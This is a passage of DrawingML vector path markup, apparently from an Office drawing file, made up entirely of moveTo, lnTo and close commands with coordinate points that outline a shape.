                  <a:lnTo>
                    <a:pt x="8070" y="9354"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7997" y="9501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7997" y="9647"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8033" y="9831"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8070" y="9978"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8143" y="10088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8363" y="10344"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8584" y="10564"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8914" y="10785"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9244" y="10968"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="11041"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9537" y="11078"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9684" y="11041"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9867" y="10968"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10051" y="10821"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10234" y="10601"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10271" y="10491"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10271" y="10381"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10271" y="10271"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="10161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="9904"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10161" y="9684"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10088" y="9464"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9977" y="9244"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9831" y="9060"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9647" y="8914"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9464" y="8767"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9060" y="8510"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="2604" y="8510"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="3815" y="9757"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4292" y="10271"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3852" y="10344"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2678" y="10674"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1577" y="10968"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1064" y="11115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="697" y="11188"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="587" y="11188"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="477" y="11151"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1577" y="9721"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1908" y="9317"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2201" y="8914"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2421" y="8730"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2604" y="8510"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="8914" y="8180"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="9097" y="8217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9244" y="8253"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9574" y="8400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9867" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10124" y="8840"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10308" y="9171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10454" y="9464"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10564" y="9794"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10601" y="10161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10601" y="10528"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10491" y="10858"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10491" y="10895"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10454" y="10858"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10344" y="10785"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10271" y="10785"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10161" y="10821"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10124" y="10931"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10088" y="11078"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10051" y="11188"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9867" y="11298"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9794" y="11371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9757" y="11445"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9611" y="11481"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9464" y="11481"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9354" y="11445"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9207" y="11408"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8620" y="11078"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8327" y="10895"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8070" y="10674"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7850" y="10418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7703" y="10124"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7593" y="9794"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7593" y="9501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7630" y="9171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7777" y="8877"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7960" y="8620"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8217" y="8400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8400" y="8290"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8584" y="8217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8730" y="8180"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="8767" y="7777"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="8547" y="7813"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8363" y="7850"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8143" y="7960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7960" y="8033"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7777" y="8180"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7593" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7446" y="8510"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7336" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7190" y="9024"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7116" y="9427"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7116" y="9831"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7153" y="10051"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7226" y="10271"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7336" y="10454"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7446" y="10638"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7740" y="11005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8107" y="11298"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8510" y="11555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8914" y="11775"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9134" y="11885"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9354" y="11958"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9574" y="11958"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9757" y="11922"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9977" y="11848"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="11702"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10381" y="11555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10491" y="11371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10674" y="11298"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10784" y="11151"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10895" y="10968"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10968" y="10785"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11005" y="10601"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11005" y="10381"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11005" y="10124"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10968" y="9684"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10821" y="9207"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10638" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10491" y="8620"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10344" y="8437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="8290"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10014" y="8143"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9831" y="8033"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9611" y="7923"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9427" y="7850"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9207" y="7813"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8987" y="7777"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="9024" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="8767" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8547" y="110"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8363" y="257"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8180" y="440"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7593" y="1027"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7006" y="1651"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6639" y="2054"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6383" y="2311"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6199" y="2605"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5796" y="2201"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5722" y="2128"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5502" y="2128"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5392" y="2201"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5356" y="2238"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4915" y="2531"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4512" y="2898"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4292" y="2715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4072" y="2495"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3998" y="2458"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3888" y="2458"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3815" y="2495"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3778" y="2568"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3778" y="2421"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3778" y="2311"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3668" y="2128"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3521" y="1908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3338" y="1761"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3118" y="1614"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2861" y="1504"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2458" y="1321"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2348" y="1321"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2238" y="1357"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2201" y="1431"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2201" y="1504"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2531" y="2238"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2678" y="2531"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2751" y="2678"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2861" y="2825"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3008" y="2898"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3191" y="2935"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3338" y="2935"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3485" y="2861"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3632" y="2788"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3301" y="3155"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2971" y="3485"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2935" y="3412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2935" y="3265"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2898" y="3081"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2825" y="2825"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2678" y="2605"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2458" y="2384"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2238" y="2238"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1981" y="2091"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1687" y="1981"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1431" y="1908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="880" y="1834"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="770" y="1834"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="697" y="1871"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="624" y="1944"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="624" y="2054"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="697" y="2384"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="807" y="2751"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="917" y="3045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1101" y="3375"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1284" y="3668"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1504" y="3925"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1724" y="4182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1981" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2018" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1761" y="4695"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1761" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1724" y="4402"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1614" y="4255"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1467" y="4108"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1321" y="3998"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1101" y="3925"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="697" y="3815"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="330" y="3742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="220" y="3742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="147" y="3815"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="110" y="3925"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="147" y="3998"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="367" y="4329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="624" y="4732"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="807" y="4915"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="954" y="5062"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1137" y="5172"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1321" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1321" y="5282"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1394" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1834" y="5759"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1651" y="6126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1504" y="6493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1394" y="6896"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1321" y="6933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1321" y="7043"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1321" y="7153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1357" y="7263"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1431" y="7373"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1467" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1541" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1651" y="7593"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2311" y="8217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2164" y="8327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2018" y="8437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1761" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1394" y="9207"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="990" y="9721"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="220" y="10748"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="73" y="10968"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="11151"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="11225"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37" y="11335"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="183" y="11518"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="257" y="11592"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="367" y="11628"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="550" y="11665"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="770" y="11628"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="990" y="11592"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2348" y="11188"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3595" y="10821"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4072" y="10711"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4292" y="10638"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4512" y="10491"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5025" y="11005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5539" y="11518"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6089" y="11995"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6676" y="12398"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7006" y="12619"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7373" y="12802"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7740" y="12985"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8070" y="13132"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8474" y="13242"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8840" y="13352"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9207" y="13426"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9611" y="13499"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9977" y="13536"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10381" y="13572"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11115" y="13536"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11812" y="13426"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12215" y="13316"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12362" y="13279"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12435" y="13279"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12435" y="13316"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12509" y="13352"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12545" y="13352"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12582" y="13316"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12619" y="13279"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12655" y="13169"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12655" y="13022"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12545" y="12949"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12435" y="12912"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12178" y="12912"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11702" y="13022"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11188" y="13095"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10748" y="13132"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10308" y="13095"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9867" y="13095"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9464" y="13022"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9024" y="12949"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8584" y="12802"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8180" y="12655"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7777" y="12509"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7300" y="12252"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6860" y="11958"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6419" y="11628"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6016" y="11298"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="10564"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4512" y="9794"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3008" y="8290"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2274" y="7520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2091" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1871" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1944" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2054" y="6383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2238" y="6053"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2421" y="5722"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2641" y="5429"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2898" y="5172"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3411" y="4622"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4475" y="3558"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5025" y="3045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="2825"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5392" y="2678"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5502" y="2605"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5612" y="2715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5392" y="2825"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="2971"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4952" y="3301"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4805" y="3485"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4695" y="3668"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4585" y="3888"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4585" y="3962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4622" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4659" y="4145"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4732" y="4145"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4915" y="4035"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5025" y="3888"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5209" y="3558"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5502" y="3228"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5759" y="2898"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6016" y="3118"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5832" y="3301"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5612" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5466" y="3742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5356" y="3962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5319" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5392" y="4182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5502" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5539" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5612" y="4182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5796" y="3998"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5942" y="3778"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6089" y="3558"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6199" y="3301"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6309" y="3375"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6456" y="3485"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6346" y="3595"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6236" y="3705"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6089" y="3962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5869" y="4255"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5796" y="4402"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5722" y="4585"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5722" y="4622"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5722" y="4695"/>
                  </a:lnTo>
